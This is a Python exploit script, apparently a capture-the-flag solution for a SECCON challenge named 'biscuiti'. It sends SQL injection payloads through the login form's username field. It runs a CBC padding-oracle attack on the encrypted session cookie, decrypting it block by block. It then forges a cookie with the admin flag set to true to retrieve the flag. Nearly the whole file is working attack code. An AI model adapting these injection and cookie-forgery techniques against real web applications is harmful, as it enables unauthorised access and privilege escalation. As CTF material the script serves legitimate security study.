import requests
from base64 import b64encode,b64decode
from bs4 import BeautifulSoup
import urllib
from tqdm import tqdm
# from m1z0r3.crypro import *
from Crypto.Util.number import bytes_to_long as b2l
from Crypto.Util.number import long_to_bytes as l2b

url = u"http://biscuiti.pwn.seccon.jp/"
enc = "Sm+RR3dlJkryPkcj3S5YWymxlzuJ43A0K6vPYHfJVOo=" # Not useing

def pad_oracle(c,p):
    values = {
        'username': "",
        'password': "",
    }
    in_state = ""
    attack_block = ""
    for j in tqdm(xrange(16)):
        # print attack_block
        for i in xrange(1,256):
            exp_pass = b64encode(("a"*(31-j))+chr(i)+attack_block+c)
            values["username"] = "' UNION SELECT 'xxxxxxxxxxxxxxxxxxxxxxxxxx','%s"%exp_pass
            r = requests.post(url,data=values)
            # print r.text
            if "Hello" not in r.text:
                in_state = chr(i^(j+1))+in_state
                break
        # print in_state
        attack_block = l2b(b2l(in_state)^b2l(chr(j+2)*(j+1)))

    ans = l2b(b2l(in_state)^b2l(p))
    print "ans:",ans.encode("hex")
    print "Done."
    print
    return ans

def main():
    # ==== Check enc_password : unnecessary ====
    username = "' UNION SELECT enc_password,'b' FROM user --"
    password = ""
    values = {
        'username':username,
        'password': password,
    }

    r = requests.post(url,data=values)
    print r.text

    # p = b64decode("Sm+RR3dlJkryPkcj3S5YWymxlzuJ43A0K6vPYHfJVOo=")[:16]
    # c = b64decode("Sm+RR3dlJkryPkcj3S5YWymxlzuJ43A0K6vPYHfJVOo=")[-16:]
    # pad_oracle(c,p) # Get admin plain password

    # ==== Prepare padding oracle ====
    ## Get first Cookie
    values['username'] = "' UNION SELECT 'xxxxxxxxxxxxxxxxxxxxxxxxxx','b"
    r = requests.post(url,data=values)
    cookie = urllib.unquote(r.cookies["JSESSION"])
    cookie = b64decode(cookie)
    print "Cookie value:"
    print cookie
    cookie_blocks = []

    # ===== Stage 1 : Get C5~C2(C1) =====
    print "===== Stage 1 ====="
    for i in xrange(6):
        cookie_blocks.append(cookie[i*16:(i+1)*16])
    # print cookie_blocks
    cookie_blocks = ['a:2:{s:4:"name";', 's:26:"xxxxxxxxxx', 'xxxxxxxxxxxxxxxx', '";s:7:"isadmin";', 'N;}'+'\x0d'*13,cookie[-16:]]
    print cookie_blocks,"\n"
    c1_5 = [cookie_blocks[-1]]

    for i in xrange(4):
        print "== Cipher block %s"%(4-i)
        c = c1_5[0]
        p = cookie_blocks[4-i]
        c1_5 = [pad_oracle(c,p)]+c1_5

    # c4 = "64caea1dae70d468a2ba64ccf871aeb1".decode("hex")
    # c3 = "ecc39815d10c1b6d97d27e23c1014993".decode("hex")
    # c2 = "35c8fba9c6b397aef066b22ebde420dc".decode("hex")
    # c1 = "88bb7c4931651cb975e48e9008c1a911".decode("hex")
    # c1_5 = [c1,c2,c3,c4,cookie_blocks[-1]]

    p5_ = "b:1;}"+("\x0b"*11)
    p3_ = b2l(p5_)^b2l(c1_5[3])^b2l(c1_5[1])
    p3_ = l2b(p3_)

    # ===== Get Second Cookie =====
    values['username'] = "' UNION SELECT 'xxxxxxxxxx%s','b"%p3_
    r = requests.post(url,data=values)
    cookie = urllib.unquote(r.cookies["JSESSION"])
    cookie = b64decode(cookie)
    print cookie

    # ===== Stage 2 : Get C'3(C'5) =====
    print "===== Stage 2 ====="
    cookie_blocks[2] = p3_ # block 3
    cookie_blocks[-1] = cookie[-16:] # block 6 : cipher
    print cookie_blocks

    c_3_5 = [cookie_blocks[-1]]
    for i in xrange(2):
        print "Cipher block %s"%(4-i)
        c = c_3_5[0]
        p = cookie_blocks[4-i]
        c_3_5 = [pad_oracle(c,p)]+c_3_5

    # c_3_5 = ["4553229817a7aa8a95708003d2e56f60".decode("hex")]+c_3_5

    # ===== Last access : Get Flag =====
    cookies = dict(JSESSION=urllib.quote(b64encode('a:2:{s:4:"name";s:26:"xxxxxxxxxxxxxxxxxxxxxxxxxx";s:7:"isadmin";b:1;}'+c_3_5[0])))
    print cookies["JSESSION"]
    r = requests.post(url,cookies=cookies)
    print r.text


if __name__ == '__main__':
    main()